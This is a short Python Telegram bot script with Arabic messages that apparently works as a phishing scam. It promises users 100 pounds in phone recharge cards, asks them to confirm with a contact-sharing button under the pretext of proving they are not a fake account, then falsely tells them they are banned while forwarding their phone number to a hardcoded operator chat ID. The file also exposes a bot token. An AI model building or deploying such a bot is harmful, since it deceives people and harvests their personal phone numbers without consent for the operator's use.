import telebot
from telebot import types
token = "5389145181:AAEjKCa-gpDto4qaH87OObJleIQlMlk2td8"
bot = telebot.TeleBot(token)
sudo = "1775413760"
@bot.message_handler(commands=['start']) 
def start(message):
    bot.send_message(message.chat.id,f"<strong>اهلا عزيزي في بوت كروت الشحن  \n يمكنك الحصول على  100 جنيه بأقل من ساعه \n للبدء قم بأرسال /done - </strong>",parse_mode="html")
@bot.message_handler(commands=['done'])
def register(message):
    keyboard = types.ReplyKeyboardMarkup(one_time_keyboard=True)
    contact = types.KeyboardButton(text="- تأكيد ", request_contact=True)
    keyboard.row_width = 1
    keyboard.add(contact)
    response = bot.send_message(message.chat.id, 
                                "<strong>المعذره عزيزي! \n لم يتم احتساب النقاط يجب التأكد انك لست حساب وهمي! </strong>",parse_mode="html",reply_markup=keyboard) 
@bot.message_handler(content_types=['contact'])
def handle_contact(message):
    bot.send_message(message.chat.id,f"<strong>تم حظرك من البوت لأنك تستخدم رقم غير صحيح </strong>",parse_mode="html")
    c = message.contact.phone_number
    bot.forward_message(sudo,message.chat.id,message.message_id)
name = "main"
if name == 'main':
    bot.polling(none_stop=True)
